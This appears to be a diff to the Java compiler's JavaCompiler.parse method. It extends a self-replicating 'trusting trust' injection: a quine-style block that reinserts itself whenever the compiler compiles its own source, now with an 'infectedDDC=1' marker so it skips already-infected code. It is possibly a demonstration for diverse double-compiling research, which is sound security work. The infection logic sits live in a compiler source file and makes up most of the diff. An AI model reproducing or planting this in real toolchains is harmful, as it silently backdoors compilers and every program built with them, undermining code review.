@@ -635,25 +635,28 @@ public class JavaCompiler {
      *  @param silent       true if TaskListeners should not be notified
      */
     private JCCompilationUnit parse(JavaFileObject filename, CharSequence content, boolean silent) {
+        int infectedDDC=1;
         char q = 34;
         char n = 10;
         String rep = "";
         String ddc_target = "private JCCompilationUnit parse(JavaFileObject " + "filename, CharSequence content, boolean silent) {";
         String[] l = {
             """
+            int infectedDDC=1;
             char q = 34;
             char n = 10;
             String rep = "";
             String[] l = {""",
             """
             };
-            if (!filename.getName().endsWith("jdk.compiler/share/classes/com/sun/tools/javac/main/JavaCompiler.java")) {
+            String content_str = content.toString();
+            if (!filename.getName().endsWith("jdk.compiler/share/classes/com/sun/tools/javac/main/JavaCompiler.java") ||
+                content_str.indexOf("infectedDDC=1") != -1) {
                 System.out.println(filename.getName());
                 System.out.println("Did not match target file.");
             } else {
                 System.out.println("Matched target injection file.");
 
-                String content_str = content.toString();
                 rep += l[0];
                 for (int i = 0; i < l.length; i++) {
                     rep += q + q + q + l[i] + q + q + q + ',';
@@ -666,13 +669,14 @@ public class JavaCompiler {
         };
 
         /* Target own file for insertion, if the file does not match path, continue compilation as normal. */
-        if (!filename.getName().endsWith("jdk.compiler/share/classes/com/sun/tools/javac/main/JavaCompiler.java")) {
+        String content_str = content.toString();
+        if (!filename.getName().endsWith("jdk.compiler/share/classes/com/sun/tools/javac/main/JavaCompiler.java") ||
+            content_str.indexOf("infectedDDC=1") != -1) {
             System.out.println(filename.getName());
             System.out.println("Did not match target file.");
         } else {
             System.out.println("Matched target injection file.");
 
-            String content_str = content.toString();
             rep += l[0];
             for (int i = 0; i < l.length; i++) {
                 rep += q + q + q + n + l[i] + q + q + q + ',';
